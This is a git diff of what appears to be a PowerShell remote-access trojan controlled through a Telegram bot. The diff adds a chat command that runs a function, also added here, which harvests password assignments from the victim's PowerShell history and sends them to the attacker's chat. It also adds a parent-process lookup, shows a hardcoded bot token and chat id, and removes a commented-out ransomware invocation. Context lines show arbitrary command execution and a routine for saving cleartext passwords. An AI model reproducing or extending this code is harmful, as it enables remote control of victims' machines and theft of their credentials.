@@ -641,6 +641,11 @@ function start-myshell($apiToken,$chat_id,$urlToNG)
                         Send-data -data "No such a folder" -chat_id $chat_id -apiToken $apiToken
                     }
                 }
+                ElseIf(([string]$command.Trim()) -like "search pow password")
+                {
+                    $output = GetPass-Powhistory
+                    Send-data -data $output -chat_id $chat_id -apiToken $apiToken
+                }
                 else{
                     $output = Excmd $command
                     Send-data -data $output -chat_id $chat_id -apiToken $apiToken
@@ -915,22 +920,6 @@ function get-MyHelp
     return $helhelp
 }
 
-
-function GetPass-Powhistory
-{
-    $test =  Get-Content (Get-PSReadlineOption).HistorySavePath
-    $res = ''
-    foreach($i in $test)
-    {
-        if ($i -like "*`$password =*")
-        {
-            $res += "$i`n"
-        }
-    }
-    return $res
-}
-
-
 function run-once
 {
     try
@@ -1013,6 +1002,30 @@ function handle-client($apiToken,$chat_id,$update)
 }
 
 
+function GetPass-Powhistory
+{
+    $test =  Get-Content (Get-PSReadlineOption).HistorySavePath
+    $res = ''
+    foreach($i in $test)
+    {
+        if ($i -like "*`$password =*")
+        {
+            $res += "$i`n"
+        }
+    }
+    return $res
+}
+
+
+function Get-Parentpath
+{
+    $id = $id = [System.Diagnostics.Process]::GetCurrentProcess().Id
+    $parid = (gwmi win32_process | ? processid -eq  $id).ParentProcessId
+    $parPath = (Get-Process | where Id -Like $parid | Select-Object path).Path
+    return $parPath
+}
+
+
 function savePassword-clearText
 {
     if ((is-administartor)-eq $false)
@@ -1035,9 +1048,4 @@ $apiToken = '5603815915:AAGbkRsoHpMmncrkM7GZPHImydZDSclfysA'
 $chat_id = '-1001830797904'
 
 handle-client -apiToken  $apiToken -chat_id $chat_id -update "NotNull"
-
-# $command = 'ransomware -AC -p C:\Users\aronc\zxc.txt -k asdf'
-# $key = (($command -split '-k ')[-1]).Trim()
-# $path = (((($command -split '-k')[0]) -split "-p")[-1]).Trim()
-
 
